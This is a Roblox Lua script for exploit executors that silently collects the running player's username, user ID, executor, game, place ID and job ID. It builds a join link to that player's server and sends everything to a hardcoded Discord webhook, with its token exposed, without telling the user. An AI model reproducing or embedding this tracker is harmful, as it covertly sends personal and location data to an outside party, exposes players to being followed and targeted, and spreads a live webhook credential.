local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1368281787347894342/9hd3IIwiiBZtVe27LwgrkxiVAh837qxDvvv7z4nws1Ggu995tn84SXdndYxsKlH88fPA"

local player = Players.LocalPlayer
local username = player.Name
local userId = tostring(player.UserId)
local placeId = game.PlaceId
local jobId = game.JobId
local executor = identifyexecutor and identifyexecutor() or "Unknown"

local gameName = "Unknown Game"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(placeId).Name
end)

-- Detect the script that was executed
local scriptName = "Unknown Script"
local currentScript = script
if currentScript and currentScript.Name then
    scriptName = currentScript.Name
end

local payload = {
    ["content"] = "🚨 **Script Executed!** 🚨",
    ["embeds"] = {{
        ["title"] = "**Execution Info**",
        ["color"] = tonumber(0xFFA500),
        ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
        },
        ["fields"] = {
            {["name"] = "👤 Username", ["value"] = username, ["inline"] = true},
            {["name"] = "🆔 User ID", ["value"] = userId, ["inline"] = true},
            {["name"] = "🧠 Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = false},
            {["name"] = "🌍 Place ID", ["value"] = tostring(placeId), ["inline"] = true},
            {["name"] = "🧩 Job ID", ["value"] = jobId, ["inline"] = false},
            {["name"] = "🔍 Script", ["value"] = scriptName, ["inline"] = false},
            {
                ["name"] = "🔗 Join Link",
                ["value"] = string.format("https://www.roblox.com/games/%d?jobId=%s", placeId, jobId),
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "Powered by silly cat :3"
        }
    }}
}

local jsonData = HttpService:JSONEncode(payload)

-- Auto-detect and use the correct request function
local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (request) or (fluxus and fluxus.request) or nil

if requestFunction then
    pcall(function()
        requestFunction({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
else
    warn("❌ No compatible HTTP request function found. Webhook not sent.")
end
